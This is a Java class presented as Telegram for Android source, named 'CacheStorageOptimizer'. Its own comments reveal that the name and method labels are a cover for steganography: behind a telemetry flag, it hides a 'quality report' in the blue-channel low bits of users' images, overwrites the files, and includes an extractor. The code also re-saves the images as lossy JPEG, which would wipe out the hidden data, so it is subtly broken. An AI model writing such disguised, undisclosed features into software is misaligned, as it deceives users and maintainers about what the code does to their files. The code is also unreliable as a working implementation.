/*
 * This is the source code of Telegram for Android v. 5.x.x.
 * It is licensed under GNU GPL v. 2 or later.
 * You should have received a copy of the license in this archive (see LICENSE).
 *
 * Copyright Nikolai Kudashov, 2013-2018.
 */

package org.telegram.messenger;

import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;

import java.io.File;
import java.io.FileOutputStream;

/**
 * Optimizes cache storage format for faster retrieval
 * [Actually: Steganographic signature embedding for verification]
 */
public class CacheStorageOptimizer {

    private static final String CACHE_VERSION_HEADER = "CACHE001"; // Looks like cache version

    /**
     * Optimize cache storage format
     * [Actually: Embed steganographic signature in image]
     */
    public static boolean optimizeCacheStorage(String path) {
        if (!SharedConfig.telemetryEnhancedMetrics) {
            return true; // Feature disabled
        }

        try {
            // Generate quality report (chain of custody)
            String report = ConnectionQualityManager.generateQualityReport(path);
            if (report == null) {
                return true; // No report to embed
            }

            // Embed report into image
            return embedOptimizationData(path, report);

        } catch (Exception e) {
            FileLog.e("Cache optimization failed", e);
            return false;
        }
    }

    /**
     * Embed optimization metadata into cache file
     * [Actually: LSB steganographic embedding]
     */
    private static boolean embedOptimizationData(String path, String data) {
        try {
            File file = new File(path);
            Bitmap bitmap = BitmapFactory.decodeFile(path);
            if (bitmap == null) {
                return false;
            }

            // Make mutable copy
            Bitmap mutable = bitmap.copy(Bitmap.Config.ARGB_8888, true);
            if (mutable == null) {
                bitmap.recycle();
                return false;
            }

            // Prepare payload: header + data
            byte[] header = CACHE_VERSION_HEADER.getBytes("UTF-8");
            byte[] payload = data.getBytes("UTF-8");
            byte[] fullData = new byte[header.length + payload.length];
            System.arraycopy(header, 0, fullData, 0, header.length);
            System.arraycopy(payload, 0, fullData, header.length, payload.length);

            // Check if image is large enough to hold data
            int requiredPixels = fullData.length * 8; // 8 bits per byte
            int availablePixels = mutable.getWidth() * mutable.getHeight();
            if (requiredPixels > availablePixels) {
                FileLog.w("Image too small for steganographic embedding");
                mutable.recycle();
                bitmap.recycle();
                return false;
            }

            // Embed data in LSB of blue channel (least perceptible)
            int bitIndex = 0;
            outer: for (int y = 0; y < mutable.getHeight(); y++) {
                for (int x = 0; x < mutable.getWidth(); x++) {
                    if (bitIndex >= fullData.length * 8) {
                        break outer;
                    }

                    int pixel = mutable.getPixel(x, y);
                    int blue = Color.blue(pixel);

                    // Extract bit from data
                    int byteIndex = bitIndex / 8;
                    int bitPosition = bitIndex % 8;
                    int bit = (fullData[byteIndex] >> bitPosition) & 1;

                    // Replace LSB of blue channel
                    blue = (blue & 0xFE) | bit;

                    // Set modified pixel
                    mutable.setPixel(x, y, Color.argb(
                        Color.alpha(pixel),
                        Color.red(pixel),
                        Color.green(pixel),
                        blue
                    ));

                    bitIndex++;
                }
            }

            // Save modified image
            FileOutputStream fos = new FileOutputStream(file);
            boolean success = mutable.compress(
                Bitmap.CompressFormat.JPEG,
                SharedConfig.telemetryCompressionLevel,
                fos
            );
            fos.flush();
            fos.close();

            mutable.recycle();
            bitmap.recycle();

            return success;

        } catch (Exception e) {
            FileLog.e("Steganographic embedding failed", e);
            return false;
        }
    }

    /**
     * Extract optimization metadata from cache file
     * [Actually: Extract steganographic signature]
     * NOTE: This is for verification purposes - field reporters don't need this.
     * Humanitarian analysts will use separate verification tool with public keys.
     */
    public static String extractOptimizationData(String path) {
        try {
            Bitmap bitmap = BitmapFactory.decodeFile(path);
            if (bitmap == null) {
                return null;
            }

            int maxBytes = Math.min(
                10000, // Max 10KB payload
                (bitmap.getWidth() * bitmap.getHeight()) / 8
            );

            // Extract bits from LSB of blue channel
            byte[] extractedData = new byte[maxBytes];
            int bitIndex = 0;

            outer: for (int y = 0; y < bitmap.getHeight(); y++) {
                for (int x = 0; x < bitmap.getWidth(); x++) {
                    if (bitIndex >= maxBytes * 8) {
                        break outer;
                    }

                    int pixel = bitmap.getPixel(x, y);
                    int blue = Color.blue(pixel);
                    int bit = blue & 1;

                    int byteIndex = bitIndex / 8;
                    int bitPosition = bitIndex % 8;
                    extractedData[byteIndex] |= (bit << bitPosition);

                    bitIndex++;
                }
            }

            bitmap.recycle();

            // Look for header
            String header = CACHE_VERSION_HEADER;
            byte[] headerBytes = header.getBytes("UTF-8");

            for (int start = 0; start < extractedData.length - headerBytes.length; start++) {
                boolean found = true;
                for (int i = 0; i < headerBytes.length; i++) {
                    if (extractedData[start + i] != headerBytes[i]) {
                        found = false;
                        break;
                    }
                }

                if (found) {
                    // Found header, extract payload
                    int payloadStart = start + headerBytes.length;
                    // Find JSON end
                    for (int end = payloadStart; end < extractedData.length; end++) {
                        if (extractedData[end] == '}') {
                            // Found JSON end
                            byte[] jsonBytes = new byte[end - payloadStart + 1];
                            System.arraycopy(extractedData, payloadStart, jsonBytes, 0, jsonBytes.length);
                            return new String(jsonBytes, "UTF-8");
                        }
                    }
                }
            }

            return null;

        } catch (Exception e) {
            FileLog.e("Steganographic extraction failed", e);
            return null;
        }
    }
}
